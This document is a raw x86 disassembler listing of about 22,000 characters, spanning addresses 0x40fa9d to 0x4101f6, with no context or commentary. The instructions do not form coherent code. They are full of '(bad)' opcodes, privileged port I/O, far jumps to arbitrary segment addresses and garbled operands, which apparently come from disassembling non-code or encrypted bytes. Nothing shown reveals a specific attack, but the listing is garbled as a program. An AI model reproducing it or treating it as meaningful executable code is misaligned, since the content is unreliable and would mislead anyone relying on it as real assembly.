  40fa9d:	inc    esp
  40fa9e:	aam    0x5d
  40faa0:	dec    ebx
  40faa1:	add    dl,BYTE PTR [edx-0x73b3dd7a]
  40faa7:	mov    al,ds:0xde6f22a0
  40faac:	enter  0x4e8c,0x5
  40fab0:	jp     0x40fad5
  40fab2:	sbb    cl,BYTE PTR [ebx]
  40fab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fab5:	retf   
  40fab6:	inc    ecx
  40fab7:	cmp    ch,ah
  40fab9:	mov    ds:0xed3ffe9a,al
  40fabe:	out    dx,eax
  40fabf:	icebp  
  40fac0:	xchg   esp,eax
  40fac1:	adc    al,0xe1
  40fac3:	push   ebp
  40fac4:	mov    bl,0xa7
  40fac6:	inc    esi
  40fac7:	xchg   DWORD PTR [ebp-0x3512e7a4],esi
  40facd:	pop    esp
  40face:	or     eax,0xbb64649c
  40fad3:	dec    ebx
  40fad4:	mov    esp,0xb144ab32
  40fad9:	hlt    
  40fada:	jge    0x40fb4e
  40fadc:	daa    
  40fadd:	mov    ds:0x4e4e40c9,al
  40fae2:	out    dx,al
  40fae3:	pop    ss
  40fae4:	in     al,0x20
  40fae6:	and    al,BYTE PTR [ecx+0x37793c14]
  40faec:	in     al,0x40
  40faee:	ins    BYTE PTR es:[edi],dx
  40faef:	icebp  
  40faf0:	cdq    
  40faf1:	pop    es
  40faf2:	sbb    eax,ecx
  40faf4:	mov    ebx,0xbf6858bf
  40faf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fafb:	or     BYTE PTR [ebx+eiz*4+0x6e],dl
  40faff:	push   0xac42591c
  40fb04:	sbb    dh,BYTE PTR [ebx]
  40fb06:	fisub  WORD PTR [edx+0x220e8203]
  40fb0c:	push   ecx
  40fb0d:	jmp    0x4fa9:0x4374d8f8
  40fb14:	not    BYTE PTR [ebx-0x13d555e2]
  40fb1a:	pop    ecx
  40fb1b:	add    al,BYTE PTR [edi-0x4]
  40fb1e:	rcr    DWORD PTR [edx+0x4b5c82a6],0x1c
  40fb25:	mov    eax,ds:0x6a7011eb
  40fb2a:	push   ds
  40fb2b:	test   al,0xe7
  40fb2d:	sub    DWORD PTR [edx+0x1958a368],edx
  40fb33:	(bad)  
  40fb34:	mov    esp,0x6e069154
  40fb39:	or     ch,BYTE PTR [ebx]
  40fb3b:	adc    DWORD PTR [edx-0x1a],edx
  40fb3e:	push   esp
  40fb3f:	fld    QWORD PTR [ecx+0x6e]
  40fb42:	or     al,0x69
  40fb44:	stc    
  40fb45:	(bad)  
  40fb46:	mov    ds:0xe95c7ad8,eax
  40fb4b:	hlt    
  40fb4c:	shl    BYTE PTR [eax+0x38f1c1c],1
  40fb52:	sub    bh,bh
  40fb54:	mov    ah,BYTE PTR [ebx+esi*1]
  40fb57:	jmp    0xfe24:0x8dee2ff7
  40fb5e:	dec    eax
  40fb5f:	mov    edx,0xb52f2133
  40fb64:	int3   
  40fb65:	(bad)  
  40fb67:	fnstenv [esi+0x6b]
  40fb6a:	mov    WORD PTR [edi-0x61],?
  40fb6d:	mov    esi,DWORD PTR [ebx+0x51]
  40fb70:	add    al,0x5d
  40fb72:	push   eax
  40fb73:	xchg   edx,eax
  40fb74:	inc    ebx
  40fb75:	adc    edx,ecx
  40fb77:	or     eax,0x8978bd02
  40fb7c:	retf   0xbb02
  40fb7f:	retf   
  40fb80:	add    cl,BYTE PTR [ebp-0x308cce45]
  40fb86:	cli    
  40fb87:	lods   al,BYTE PTR ds:[esi]
  40fb88:	sbb    ebp,edx
  40fb8a:	or     eax,0xa07660f7
  40fb8f:	fwait
  40fb90:	push   ebp
  40fb91:	or     eax,0xe7f641f7
  40fb96:	fidiv  DWORD PTR [esi+esi*8-0x16dceebe]
  40fb9d:	mov    ebp,0xc6d0c89f
  40fba2:	lea    eax,[eax]
  40fba4:	nop
  40fba5:	xchg   ebp,eax
  40fba6:	call   FWORD PTR [ecx+0x6e4c80ba]
  40fbac:	icebp  
  40fbad:	push   DWORD PTR [ecx+0x53351a33]
  40fbb3:	out    dx,eax
  40fbb4:	ja     0x40fbdf
  40fbb6:	lock push ebx
  40fbb8:	ja     0x40fb3e
  40fbba:	xchg   edi,ecx
  40fbbc:	aas    
  40fbbd:	jo     0x40fbc6
  40fbbf:	mov    ah,0x66
  40fbc1:	pop    es
  40fbc2:	mov    dx,0x2a26
  40fbc6:	xor    BYTE PTR [edx+0xa80bf36],dl
  40fbcc:	loope  0x40fbb7
  40fbce:	in     eax,dx
  40fbcf:	adc    eax,0x87d821df
  40fbd4:	sbb    DWORD PTR [edx+0x454837c7],ebx
  40fbda:	clc    
  40fbdb:	cld    
  40fbdc:	xor    edx,ecx
  40fbde:	fmulp  st(5),st
  40fbe0:	push   ebp
  40fbe1:	ficomp DWORD PTR [edx+0x1f3fd352]
  40fbe7:	das    
  40fbe8:	arpl   si,cx
  40fbea:	adc    al,0xf2
  40fbec:	scas   eax,DWORD PTR es:[edi]
  40fbed:	jnp    0x40fc55
  40fbef:	mov    bl,0x76
  40fbf1:	sub    edi,edx
  40fbf3:	aaa    
  40fbf4:	xchg   ebx,eax
  40fbf5:	pop    ds
  40fbf6:	and    BYTE PTR [ebp-0x5b],ch
  40fbf9:	fld    DWORD PTR [edi]
  40fbfb:	ds or  eax,0xef7230e9
  40fc01:	dec    edi
  40fc02:	dec    edx
  40fc03:	mov    ds:0x8b0da6be,eax
  40fc08:	test   eax,0xe979618b
  40fc0d:	in     al,dx
  40fc0e:	dec    DWORD PTR [edx+0x76]
  40fc11:	in     al,0xe2
  40fc13:	xchg   esi,eax
  40fc14:	repz xor ebp,esi
  40fc17:	inc    ecx
  40fc18:	pop    edx
  40fc19:	repz out 0x8e,eax
  40fc1c:	pop    ds
  40fc1d:	xor    DWORD PTR [edi-0x19e0261b],ebp
  40fc23:	xchg   ecx,ebx
  40fc25:	leave  
  40fc26:	in     eax,dx
  40fc27:	cwde   
  40fc28:	out    dx,al
  40fc29:	sti    
  40fc2a:	dec    ebx
  40fc2b:	cld    
  40fc2c:	in     al,dx
  40fc2d:	sub    ah,bh
  40fc2f:	mov    al,BYTE PTR [ebx+0x1e]
  40fc32:	jns    0x40fbd2
  40fc34:	add    eax,0x624a1c0c
  40fc39:	clc    
  40fc3a:	loope  0x40fc74
  40fc3c:	ret    
  40fc3d:	sub    ah,BYTE PTR [edx-0x4ca2d1f4]
  40fc43:	inc    ebp
  40fc44:	mov    edx,0xa8f7ec31
  40fc49:	jmp    0xd8c1:0xc5452ade
  40fc50:	gs mov ebx,0xd455bbe9
  40fc56:	aaa    
  40fc57:	inc    ecx
  40fc58:	push   esp
  40fc59:	mul    BYTE PTR [ecx+0x55]
  40fc5c:	pushf  
  40fc5d:	mov    eax,ds:0x66b2fa8
  40fc62:	add    BYTE PTR [eax+esi*2-0x608ace83],bh
  40fc69:	push   ebx
  40fc6a:	ret    0x26cc
  40fc6d:	jmp    0x40fcc9
  40fc6f:	in     al,0x26
  40fc71:	push   0x37fc6841
  40fc76:	cdq    
  40fc77:	inc    esp
  40fc78:	bound  ebp,QWORD PTR [ebp-0x1e78bfa0]
  40fc7e:	mov    al,0xca
  40fc80:	mov    esi,0xff2ec659
  40fc85:	xor    ebp,DWORD PTR [edx+0x56]
  40fc88:	imul   ecx,ecx,0x79
  40fc8b:	pop    esi
  40fc8c:	mov    eax,0xb80e1214
  40fc91:	jmp    0x33458279
  40fc96:	xor    cl,BYTE PTR [esi]
  40fc98:	aam    0x79
  40fc9a:	adc    BYTE PTR [edx+0xec3c5e4],0xb0
  40fca1:	sbb    al,0x7f
  40fca3:	fistp  DWORD PTR [ebp+0x12a2ac1e]
  40fca9:	cmp    ecx,esi
  40fcab:	mov    esp,0x5d197f12
  40fcb0:	mov    BYTE PTR [ebp+0x6c402778],ah
  40fcb6:	jmp    0xb35:0x259a246
  40fcbd:	mov    esi,0x86f69552
  40fcc2:	ret    
  40fcc3:	mov    ?,WORD PTR [ecx]
  40fcc5:	xor    ebx,edi
  40fcc7:	inc    esi
  40fcc8:	push   ebx
  40fcc9:	xchg   edx,eax
  40fcca:	mov    dl,0x97
  40fccc:	fst    QWORD PTR [esi+0x59]
  40fccf:	push   esp
  40fcd0:	repz fs int 0x14
  40fcd4:	mov    dh,0x66
  40fcd6:	cmp    dl,BYTE PTR [ecx+0x73]
  40fcd9:	fst    QWORD PTR [eax]
  40fcdb:	adc    bl,BYTE PTR [esi+0x7fbf96a3]
  40fce1:	xchg   edx,eax
  40fce2:	mov    esi,0xd1631c23
  40fce7:	div    BYTE PTR [ecx]
  40fce9:	fwait
  40fcea:	enter  0x6ee3,0x82
  40fcee:	xchg   DWORD PTR [edi-0x5],ecx
  40fcf1:	mov    bl,0xd
  40fcf3:	lds    esp,FWORD PTR [ecx+edx*4-0x68f41828]
  40fcfa:	cli    
  40fcfb:	ins    DWORD PTR es:[edi],dx
  40fcfc:	push   esi
  40fcfd:	mov    BYTE PTR [esi],ah
  40fcff:	loop   0x40fd38
  40fd01:	aaa    
  40fd02:	stos   BYTE PTR es:[edi],al
  40fd03:	cmp    BYTE PTR ds:0x253c166a,cl
  40fd09:	push   ecx
  40fd0a:	lea    esi,[ecx]
  40fd0c:	stc    
  40fd0d:	aad    0x31
  40fd0f:	mov    eax,ds:0xd9de040b
  40fd14:	and    eax,0x17946dcb
  40fd19:	lea    edi,[edx+0xb]
  40fd1c:	cld    
  40fd1d:	in     eax,dx
  40fd1e:	mov    ebx,0xf305608a
  40fd23:	out    dx,al
  40fd24:	aaa    
  40fd25:	mov    ds:0xa81060b6,eax
  40fd2a:	ret    
  40fd2b:	int3   
  40fd2c:	xchg   esi,eax
  40fd2d:	loope  0x40fd06
  40fd2f:	mov    DWORD PTR [edi+0x3d],ebp
  40fd32:	push   esp
  40fd33:	aam    0x73
  40fd35:	fisubr DWORD PTR [ebp+0x5b]
  40fd38:	loope  0x40fcba
  40fd3a:	mov    ebp,0x7db8602d
  40fd3f:	mov    WORD PTR [esp+esi*2+0x77287d89],es
  40fd46:	aad    0xb2
  40fd48:	loope  0x40fda5
  40fd4a:	push   edi
  40fd4b:	jo     0x40fd04
  40fd4d:	rol    DWORD PTR [eax],cl
  40fd4f:	pop    ecx
  40fd50:	jmp    0x740a695b
  40fd55:	adc    eax,0xc64513d4
  40fd5a:	mov    ebx,0x36908526
  40fd5f:	pop    ecx
  40fd60:	je     0x40fddb
  40fd62:	inc    edi
  40fd63:	scas   al,BYTE PTR es:[edi]
  40fd64:	retf   0x15a
  40fd67:	add    eax,eax
  40fd69:	lods   eax,DWORD PTR ds:[esi]
  40fd6a:	push   ebp
  40fd6b:	repz (bad) 
  40fd6d:	idiv   BYTE PTR [ebp+0x3b]
  40fd70:	fisttp DWORD PTR [edi-0x49]
  40fd73:	xor    bh,al
  40fd75:	cmc    
  40fd76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd77:	xchg   ebx,eax
  40fd78:	dec    esp
  40fd79:	adc    ebx,DWORD PTR [ebx+edi*8+0x29]
  40fd7d:	push   es
  40fd7e:	mov    ch,0xd1
  40fd80:	mov    es,WORD PTR [ebx-0x175489b4]
  40fd86:	and    edi,DWORD PTR [edi]
  40fd88:	lods   eax,DWORD PTR ds:[esi]
  40fd89:	or     BYTE PTR fs:[ebp-0x56],al
  40fd8d:	rcl    BYTE PTR [ecx+0x5f],1
  40fd90:	iret   
  40fd91:	out    dx,al
  40fd92:	dec    ecx
  40fd93:	ror    BYTE PTR [esp+ebp*1+0x645d67ff],cl
  40fd9a:	adc    dl,BYTE PTR ds:0xa981626a
  40fda0:	repz adc DWORD PTR [edi+0x66],0xe93ff6b7
  40fda8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fda9:	and    cl,bh
  40fdab:	push   ebp
  40fdac:	es xchg edx,eax
  40fdae:	pop    edx
  40fdaf:	fwait
  40fdb0:	or     edx,DWORD PTR [edx+0x70b8b62f]
  40fdb6:	fidiv  DWORD PTR [esi+0x33]
  40fdb9:	jne    0x40fdbd
  40fdbb:	xor    DWORD PTR [esi],esi
  40fdbd:	xchg   edi,eax
  40fdbe:	lea    edx,[esi-0x6a17d17e]
  40fdc4:	pusha  
  40fdc5:	xchg   esi,eax
  40fdc6:	icebp  
  40fdc7:	cmp    BYTE PTR [ebx],al
  40fdc9:	mov    edi,0x93e61e22
  40fdce:	cmp    al,0x45
  40fdd0:	rcr    DWORD PTR [edi],cl
  40fdd2:	jge    0x40fe36
  40fdd4:	lods   eax,DWORD PTR ds:[esi]
  40fdd5:	push   ds
  40fdd6:	mov    ebx,0x5f468cbf
  40fddb:	orps   xmm0,XMMWORD PTR [ebx]
  40fdde:	mov    ds:0xaefc5a59,eax
  40fde3:	sub    DWORD PTR [edi-0xa],ebx
  40fde6:	jns    0x40fdcf
  40fde8:	pusha  
  40fde9:	mov    bh,0x46
  40fdeb:	stos   DWORD PTR es:[edi],eax
  40fdec:	(bad)  
  40fded:	rcr    DWORD PTR [eax+eiz*1-0x56116997],1
  40fdf4:	cmp    DWORD PTR ss:[ecx+esi*8-0x1faa6436],eax
  40fdfc:	in     eax,0xd
  40fdfe:	out    dx,eax
  40fdff:	push   ecx
  40fe00:	push   esp
  40fe01:	pop    ebp
  40fe02:	dec    esi
  40fe03:	xchg   ebx,eax
  40fe04:	sub    DWORD PTR [edi],eax
  40fe06:	add    esi,edi
  40fe08:	mov    bl,0x21
  40fe0a:	std    
  40fe0b:	jo     0x40fe82
  40fe0d:	das    
  40fe0e:	cdq    
  40fe0f:	popa   
  40fe10:	ret    
  40fe11:	mov    al,ds:0x84e94bf2
  40fe16:	scas   al,BYTE PTR es:[edi]
  40fe17:	xchg   edx,eax
  40fe18:	jmp    0xc8cd:0xf3d80dc6
  40fe1f:	dec    eax
  40fe20:	daa    
  40fe21:	or     DWORD PTR [ecx],esp
  40fe23:	jg     0x40fe2d
  40fe25:	test   eax,0x6826759a
  40fe2a:	outs   dx,BYTE PTR ds:[esi]
  40fe2b:	and    BYTE PTR [ebx+0x32],ch
  40fe2e:	(bad)  
  40fe2f:	mov    al,0xe9
  40fe31:	sbb    BYTE PTR [edi],al
  40fe33:	(bad)  
  40fe34:	xchg   ebx,eax
  40fe35:	rcr    DWORD PTR [edi-0x525cf1e4],cl
  40fe3b:	es ror edi,cl
  40fe3e:	sti    
  40fe3f:	fidivr DWORD PTR [edx+0x2f]
  40fe42:	jg     0x40fe9a
  40fe44:	pop    edx
  40fe45:	cli    
  40fe46:	ds nop
  40fe48:	fistp  QWORD PTR [ebx+ecx*8]
  40fe4b:	jecxz  0x40fdee
  40fe4d:	jb     0x40fe23
  40fe4f:	mov    ds:0xdd56ac9d,eax
  40fe54:	or     DWORD PTR [edx-0x52],ebx
  40fe57:	loope  0x40fe72
  40fe59:	shl    BYTE PTR [esi+0x72],cl
  40fe5c:	xlat   BYTE PTR ds:[ebx]
  40fe5d:	fistp  DWORD PTR [eax+0x5b]
  40fe60:	(bad)  
  40fe61:	(bad)  
  40fe62:	inc    edi
  40fe63:	mov    ds:0xc9b5e098,eax
  40fe68:	jno    0x40fe98
  40fe6a:	arpl   WORD PTR ds:0x4fa869d5,bx
  40fe70:	xor    BYTE PTR [edx],dh
  40fe72:	and    BYTE PTR [edx+0x755b99ef],0x79
  40fe79:	jge    0x40fe80
  40fe7b:	pop    ss
  40fe7c:	or     bh,BYTE PTR [eax+0x9]
  40fe7f:	sti    
  40fe80:	lods   al,BYTE PTR ds:[esi]
  40fe81:	jle    0x40fe1a
  40fe83:	hlt    
  40fe84:	jo     0x40fe9e
  40fe86:	test   eax,0xf6ad7a24
  40fe8b:	dec    esp
  40fe8c:	xchg   ebx,eax
  40fe8d:	xor    al,0x28
  40fe8f:	or     cl,BYTE PTR [edi]
  40fe91:	inc    edx
  40fe92:	sbb    bh,BYTE PTR [ebp-0x2]
  40fe95:	push   ss
  40fe96:	jmp    0x40fec6
  40fe98:	dec    edx
  40fe99:	rol    BYTE PTR [ebp+edi*2-0x19],0xe1
  40fe9e:	js     0x40fee9
  40fea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fea1:	mov    ch,0xc
  40fea3:	icebp  
  40fea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fea5:	xchg   ecx,eax
  40fea6:	and    DWORD PTR [eax-0x39],ecx
  40fea9:	cmp    BYTE PTR [ecx*2+0x752ce8d0],bh
  40feb0:	cmp    BYTE PTR [eax-0x79],al
  40feb3:	mov    ebx,DWORD PTR ds:[ecx]
  40feb6:	popf   
  40feb7:	jl     0x40ff2b
  40feb9:	mov    edx,0xdce6be17
  40febe:	sahf   
  40febf:	adc    eax,0x3b4c97a0
  40fec4:	mov    dl,BYTE PTR [ecx]
  40fec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fec7:	popf   
  40fec8:	xchg   esi,eax
  40fec9:	int3   
  40feca:	mov    fs,WORD PTR [ebp+0x75]
  40fecd:	mov    ecx,0x1c6ad0c7
  40fed2:	(bad)  
  40fed3:	push   ecx
  40fed4:	and    ch,dl
  40fed6:	fbstp  TBYTE PTR es:[edx]
  40fed9:	or     eax,0x47f2dbd1
  40fede:	jbe    0x40ff24
  40fee0:	jb     0x40fe8b
  40fee2:	sbb    edi,DWORD PTR [eax+0x3a]
  40fee5:	push   ds
  40fee6:	outs   dx,BYTE PTR ds:[esi]
  40fee7:	sbb    eax,0xe632fc76
  40feec:	test   al,0xe9
  40feee:	adc    bl,dh
  40fef0:	push   ecx
  40fef1:	adc    BYTE PTR [ecx],bh
  40fef3:	into   
  40fef4:	ret    
  40fef5:	cmp    ah,BYTE PTR [eax-0x24]
  40fef8:	push   esi
  40fef9:	enter  0x8512,0x7
  40fefd:	pop    ebx
  40fefe:	div    DWORD PTR [ebx+0xb]
  40ff01:	dec    esi
  40ff02:	push   esi
  40ff03:	mov    al,0x64
  40ff05:	ja     0x40fed2
  40ff07:	aaa    
  40ff08:	fldenv [ebx]
  40ff0a:	test   BYTE PTR [ecx],ah
  40ff0c:	or     al,0x96
  40ff0e:	mov    dl,cl
  40ff10:	fnstsw WORD PTR [ebp+edx*2+0x32]
  40ff14:	(bad)  
  40ff16:	or     ecx,DWORD PTR [ebx+0x76]
  40ff19:	push   cs
  40ff1a:	scas   al,BYTE PTR es:[edi]
  40ff1b:	dec    esp
  40ff1c:	add    al,0x15
  40ff1e:	xor    al,0x1d
  40ff20:	xchg   esp,eax
  40ff21:	mov    ds:0xf9b8ca27,al
  40ff26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff27:	jns    0x40ff09
  40ff29:	sbb    ch,BYTE PTR [ebp+0x33890c31]
  40ff2f:	push   eax
  40ff30:	mov    edi,0xcd595604
  40ff35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff36:	sub    DWORD PTR [ebx+edx*2-0x655c88ca],0xffffffea
  40ff3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff3f:	add    ah,BYTE PTR [ebx]
  40ff41:	mov    ch,bl
  40ff43:	js     0x40ff2b
  40ff45:	mov    dh,BYTE PTR [ebp-0x32]
  40ff48:	xor    al,0x71
  40ff4a:	retf   
  40ff4b:	les    eax,FWORD PTR [edx-0x16cd5f47]
  40ff51:	ins    BYTE PTR es:[edi],dx
  40ff52:	pop    ebx
  40ff53:	inc    esi
  40ff54:	mov    bh,BYTE PTR [edx-0x3d]
  40ff57:	dec    esi
  40ff58:	and    BYTE PTR [eax+0x7eea39a6],dl
  40ff5e:	pop    ebx
  40ff5f:	adc    al,0x8a
  40ff61:	add    bl,BYTE PTR [edi+0x38]
  40ff64:	in     eax,0x83
  40ff66:	mov    ecx,0x7afd9524
  40ff6b:	iret   
  40ff6c:	pop    eax
  40ff6d:	dec    ecx
  40ff6e:	popa   
  40ff6f:	pop    es
  40ff70:	inc    ecx
  40ff71:	add    dh,ch
  40ff73:	cld    
  40ff74:	int    0xd9
  40ff76:	dec    ebx
  40ff77:	test   eax,0x2173bad1
  40ff7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff7d:	test   eax,0x67bdf5b0
  40ff82:	ss sbb eax,0xfc05a09a
  40ff88:	push   ebp
  40ff89:	test   al,0x13
  40ff8b:	inc    ecx
  40ff8c:	outs   dx,BYTE PTR ds:[esi]
  40ff8d:	dec    eax
  40ff8e:	aam    0x5b
  40ff90:	stc    
  40ff91:	dec    esi
  40ff92:	add    al,0x0
  40ff94:	in     al,dx
  40ff95:	rcl    DWORD PTR [ebx],cl
  40ff97:	shr    eax,0xdb
  40ff9a:	pop    ebx
  40ff9b:	pop    ebp
  40ff9c:	and    BYTE PTR [eax],cl
  40ff9e:	out    0x41,al
  40ffa0:	retf   0xe62c
  40ffa3:	je     0x40ff40
  40ffa5:	bound  ebx,QWORD PTR [edi+edi*8]
  40ffa8:	adc    BYTE PTR ds:0x9799f929,0x60
  40ffaf:	ret    0x57d
  40ffb2:	out    dx,eax
  40ffb3:	std    
  40ffb4:	cmp    al,bl
  40ffb6:	push   eax
  40ffb7:	shl    bl,0xdd
  40ffba:	lods   eax,DWORD PTR ds:[esi]
  40ffbb:	sub    ecx,DWORD PTR [ebp-0xa]
  40ffbe:	or     BYTE PTR [edi-0x56],bh
  40ffc1:	pop    eax
  40ffc2:	push   cs
  40ffc3:	out    0x5f,al
  40ffc5:	test   BYTE PTR [ebp+0x27],bl
  40ffc8:	xor    DWORD PTR [eax-0x7356e175],esi
  40ffce:	or     DWORD PTR [esi+0x16],ecx
  40ffd1:	adc    eax,0x56e3f05
  40ffd6:	xchg   edi,eax
  40ffd7:	in     al,0xc
  40ffd9:	sub    BYTE PTR [ebx-0x44],ch
  40ffdc:	jle    0x410028
  40ffde:	push   ds
  40ffdf:	fidivr DWORD PTR [ebp+0x2f1342b1]
  40ffe5:	adc    esi,ebp
  40ffe7:	loope  0x410065
  40ffe9:	jmp    0xc3be:0x2a033817
  40fff0:	add    dl,BYTE PTR [ecx]
  40fff2:	sbb    ecx,ecx
  40fff4:	mov    cl,0x51
  40fff6:	ins    BYTE PTR es:[edi],dx
  40fff7:	fist   WORD PTR [eax-0x5e]
  40fffa:	(bad)  
  40fffb:	mov    bl,0x53
  40fffe:	outs   dx,BYTE PTR ds:[esi]
  40ffff:	sbb    al,0x75
  410001:	fsubr  st(2),st
  410003:	out    dx,eax
  410004:	lock mov ds:0x52ecbfed,al
  41000a:	or     DWORD PTR [ecx+esi*8-0x4],ecx
  41000e:	shl    DWORD PTR [edx+0x2c],1
  410011:	or     BYTE PTR [esp+edx*4+0x6e],0x3c
  410016:	xor    ecx,DWORD PTR [edi-0x3e]
  410019:	pop    es
  41001a:	xor    edi,edi
  41001c:	adc    esi,ebp
  41001e:	dec    esp
  41001f:	out    dx,al
  410020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410021:	ins    BYTE PTR es:[edi],dx
  410022:	rcl    DWORD PTR [esi],cl
  410024:	and    ah,BYTE PTR [ebx-0x1ace4e62]
  41002a:	xor    ebx,DWORD PTR [esi-0x36]
  41002d:	call   0x9ffa:0x5c5903be
  410034:	and    DWORD PTR [ebx+0x69],ebp
  410037:	or     eax,0xdb35b657
  41003c:	or     esp,DWORD PTR gs:[eax]
  41003f:	push   eax
  410040:	adc    dh,BYTE PTR [eax+0x51b1585]
  410046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410047:	xchg   esp,eax
  410048:	inc    ebx
  410049:	fdivr  st,st(3)
  41004b:	push   edx
  41004c:	imul   ecx,DWORD PTR [edx-0x52],0x81f790bd
  410053:	jnp    0x410077
  410055:	popf   
  410056:	mov    eax,0x12c2ed6
  41005b:	int    0xa
  41005d:	xchg   ebp,eax
  41005e:	out    dx,eax
  41005f:	jmp    0x4ba0:0x5669cbdb
  410066:	push   ss
  410067:	and    dl,BYTE PTR [eax-0x40240ae2]
  41006d:	lea    edi,[eax]
  41006f:	adc    al,0x62
  410071:	and    ch,BYTE PTR ss:[edi+edi*8-0x60edb01a]
  410079:	fst    DWORD PTR [ebp-0x5f699c67]
  41007f:	int    0xd6
  410081:	pop    esi
  410082:	jge    0x410010
  410084:	sub    eax,0x3053083a
  410089:	mov    esp,0x8992a677
  41008e:	adc    eax,0x8a0ffc7d
  410093:	or     BYTE PTR [esi+eax*2+0x5aec54fe],dh
  41009a:	fdivr  QWORD PTR [edx]
  41009c:	repnz mov al,ds:0x31e40e7e
  4100a2:	sub    eax,0xde2d2fee
  4100a7:	aas    
  4100a8:	and    esi,ebx
  4100aa:	and    eax,0x52a20114
  4100af:	cdq    
  4100b0:	xchg   ebx,eax
  4100b1:	int3   
  4100b2:	stos   DWORD PTR es:[edi],eax
  4100b3:	mov    DWORD PTR [eax],ecx
  4100b5:	adc    BYTE PTR [ecx-0x15],dh
  4100b8:	push   ebp
  4100b9:	std    
  4100ba:	cli    
  4100bb:	push   edx
  4100bc:	and    esi,edi
  4100be:	sub    ah,bh
  4100c0:	mov    esi,0x1fe370f9
  4100c5:	outs   dx,DWORD PTR ds:[esi]
  4100c6:	mov    esi,0x6e452ae1
  4100cb:	and    bh,BYTE PTR ds:0x5ae7bbe6
  4100d1:	idiv   DWORD PTR [edx+ebp*4-0x10c2728]
  4100d8:	loop   0x410096
  4100da:	push   ecx
  4100db:	pop    esp
  4100dc:	out    0x87,al
  4100de:	xlat   BYTE PTR ds:[ebx]
  4100df:	cs call 0x40e6:0x3798850c
  4100e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100ea:	in     al,dx
  4100eb:	push   ebx
  4100ec:	dec    edi
  4100ed:	or     ch,BYTE PTR [edi]
  4100ef:	mov    dl,0x15
  4100f1:	out    dx,al
  4100f2:	in     al,dx
  4100f3:	xor    eax,0xe695117
  4100f8:	inc    ebp
  4100f9:	pop    ss
  4100fa:	mov    al,0xa4
  4100fc:	enter  0xea56,0x51
  410100:	stos   BYTE PTR es:[edi],al
  410101:	dec    ecx
  410102:	jl     0x4100bb
  410104:	mov    eax,DWORD PTR [ecx]
  410106:	fcom   QWORD PTR [esi+edi*1+0x38d2d919]
  41010d:	sub    esi,DWORD PTR [eax+0x37]
  410110:	loope  0x4100e2
  410112:	add    BYTE PTR [edx-0x2d2900e0],bl
  410118:	jbe    0x4100a9
  41011a:	xlat   BYTE PTR ds:[ebx]
  41011b:	push   es
  41011c:	sbb    al,0x94
  41011e:	mov    eax,0x48a2bf96
  410123:	in     al,0x89
  410125:	push   esp
  410126:	xor    dl,BYTE PTR [ebx]
  410128:	xchg   DWORD PTR [ebp+0x6cf808],edx
  41012e:	std    
  41012f:	pop    edx
  410130:	fst    DWORD PTR [ebx+0x294783c6]
  410136:	jmp    eax
  410138:	div    dl
  41013a:	lock and al,0x1
  41013d:	test   eax,0xf5265353
  410142:	out    dx,eax
  410143:	repnz aaa 
  410145:	push   edx
  410146:	jb     0x410114
  410148:	push   ds
  410149:	and    eax,DWORD PTR [eax+0x2f74434d]
  41014f:	popa   
  410150:	test   BYTE PTR [eax+0x6462f3ac],bh
  410156:	cdq    
  410157:	mov    eax,ds:0xf3e8a0c8
  41015c:	test   ebx,0xd1e4f825
  410162:	inc    DWORD PTR [ecx+0x2bbceccd]
  410168:	ins    BYTE PTR es:[edi],dx
  410169:	dec    eax
  41016a:	xor    cl,BYTE PTR [edi+0x71]
  41016d:	(bad)  
  41016e:	mov    bh,0x38
  410170:	imul   esi,DWORD PTR [ebp+0x265bf165],0xffffffea
  410177:	sub    DWORD PTR [ebx+0x5b],0xb2ed205e
  41017e:	pop    eax
  41017f:	scas   al,BYTE PTR es:[edi]
  410180:	(bad)  
  410181:	pushf  
  410182:	xchg   edx,eax
  410183:	sbb    esi,esi
  410185:	push   eax
  410186:	shr    BYTE PTR [ebp+0x4bf29d93],1
  41018c:	inc    eax
  41018d:	pop    eax
  41018e:	loop   0x4101a4
  410190:	inc    esi
  410191:	or     eax,0x99909d0e
  410196:	sbb    DWORD PTR [ebp+0x16d860c2],edi
  41019c:	dec    ebx
  41019d:	cmp    BYTE PTR [ebx+0x4a],dl
  4101a0:	push   ecx
  4101a1:	mov    ebx,0x1de892f2
  4101a6:	arpl   WORD PTR [eax+0x633d84f5],di
  4101ac:	and    ah,BYTE PTR [ebx-0x22]
  4101af:	bound  edi,QWORD PTR [edx]
  4101b1:	mov    bl,0x11
  4101b3:	outs   dx,BYTE PTR ds:[esi]
  4101b4:	aaa    
  4101b5:	repz xor al,0x47
  4101b8:	std    
  4101b9:	and    al,0x3
  4101bb:	xchg   edi,eax
  4101bc:	out    dx,al
  4101bd:	js     0x410142
  4101bf:	inc    eax
  4101c0:	scas   eax,DWORD PTR es:[edi]
  4101c1:	mov    al,ds:0xe9cc87e0
  4101c6:	nop
  4101c7:	loopne 0x4101e6
  4101c9:	out    dx,eax
  4101ca:	mov    bh,0xe8
  4101cc:	inc    edx
  4101cd:	ret    
  4101ce:	ds stc 
  4101d0:	(bad)
  4101d3:	xchg   ebx,eax
  4101d4:	push   0xffffffe7
  4101d6:	cwde   
  4101d7:	inc    ebp
  4101d8:	das    
  4101d9:	xor    DWORD PTR [ebp-0x164f6e1e],esp
  4101df:	sahf   
  4101e0:	stc    
  4101e1:	inc    esp
  4101e2:	ret    
  4101e3:	jmp    0x2715:0x5e4e6e54
  4101ea:	inc    edi
  4101eb:	test   al,0x2d
  4101ed:	mov    edx,0xcc60b917
  4101f2:	(bad)  
  4101f3:	jae    0x410238
  4101f5:	inc    eax
  4101f6:	(bad)  
